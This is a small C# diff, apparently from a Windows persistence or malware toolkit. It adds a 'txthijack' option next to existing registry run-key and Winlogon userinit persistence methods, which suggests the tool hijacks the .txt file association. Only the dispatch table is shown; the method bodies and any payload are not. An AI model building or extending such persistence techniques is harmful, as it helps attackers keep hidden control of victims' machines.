@@ -68,8 +68,8 @@ class Info
     {
         { "runlocalmachine", (name) => Registrys.RunLocalMachine(name) },
         { "runlocaluser", (name) => Registrys.RunLogonUser(name) },
-        { "wininit", (_) => Registrys.WinLogonUserInit() }
+        { "wininit", (_) => Registrys.WinLogonUserInit() },
+        { "txthijack", (_) => Registrys.PersistTxtfile() }
     }; 
-
 }
 
